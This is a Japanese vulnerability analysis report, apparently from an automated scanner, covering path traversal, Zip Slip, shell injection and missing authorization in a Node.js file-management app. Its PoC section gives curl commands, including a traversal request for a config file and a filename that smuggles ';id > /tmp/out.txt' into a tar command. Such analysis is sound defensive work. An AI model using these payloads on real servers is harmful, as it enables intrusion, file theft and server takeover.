# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 80**

## 脆弱性タイプ

- `LFI`
- `RCE`
- `AFO`
- `IDOR`

## 解析結果

本コードでは認証・権限制御が一切なく、ユーザー入力をそのままファイルシステムやシェルコマンドに渡している箇所が多数あり、以下の重大な脆弱性が確認されます。

1. AFO（任意ファイル上書き）／LFI（ディレクトリトラバーサル）
   - /upload でアップロードファイル名を検証せずに既存ファイルを上書き可能
   - /download,/read,/delete,/list で入力パラメータをそのまま path.join に渡し、ディレクトリトラバーサル攻撃が可能
2. RCE（リモートコード実行）
   - /compress でファイル名配列を結合して tar コマンドに渡しており、シェルインジェクションが可能
3. LFI（Zip Slip）
   - /extract で extract-zip による ZIP 展開時のパス検証がなく、Zip Slip 攻撃が可能
4. IDOR（認可なし直接参照）
   - 全エンドポイントで認証・認可がなく、他ユーザーのファイル操作や情報取得が可能

影響範囲はサーバー上の任意ファイル読み書き、上書き、削除、コマンド実行によるサーバー乗っ取りまで多岐に渡ります。

## PoC（概念実証コード）

```text
1) ディレクトリトラバーサルによる機密ファイル取得例
   curl "http://target/download?filename=../config/constants.js"

2) Zip Slip による/etc/passwd 上書き例
   (悪意のある ZIP を用意し ../etc/passwd を含めてアップロード)
   curl -F archive=@evil.zip http://target/extract

3) コマンドインジェクション例
   curl -X POST -H "Content-Type: application/json" -d '{"files":["/tmp/file.txt;id > /tmp/out.txt"],"archive_name":"test.tar.gz"}' http://target/compress
   # /tmp/out.txt に id コマンド結果が入る
```

## 関連コードコンテキスト

### 関数名: /upload route
- 理由: ユーザー制御のファイル名で既存ファイルを上書き可能（AFO）
- パス: ./routes/files.js
```rust
const uploadPath = path.join(UPLOAD_CONFIG.UPLOAD_DIR, req.file.originalname);
```

### 関数名: /download route
- 理由: query.filename に../を含めれば任意ファイルをダウンロード（LFI）
- パス: ./routes/files.js
```rust
const filePath = path.join(UPLOAD_CONFIG.UPLOAD_DIR, filename);
```

### 関数名: /read route
- 理由: パス検証なしに任意ファイルを読み込み（LFI）
- パス: ./routes/files.js
```rust
const content = fs.readFileSync(filePath, 'utf8');
```

### 関数名: /extract route
- 理由: ZIP 内の../で任意場所に展開できる（Zip Slip／LFI）
- パス: ./routes/files.js
```rust
await extract(req.file.path, { dir: extractDir });
```

### 関数名: /compress route
- 理由: ファイル名にシェル特殊文字を入れればコマンドインジェクション（RCE）
- パス: ./routes/files.js
```rust
const command = `tar -czf ${archivePath} ${fileList}`;
```

### 関数名: /delete route
- 理由: 認証なしに任意ファイルを削除可能（IDOR/LFI）
- パス: ./routes/files.js
```rust
fs.unlinkSync(filePath);
```

## 解析ノート

コード中の各ルートにユーザー入力検証が欠如している点を確認し、サニタイズ／認可チェックの不在を発見。特に path.join に頼った実装と execSync の直接実行が致命的。

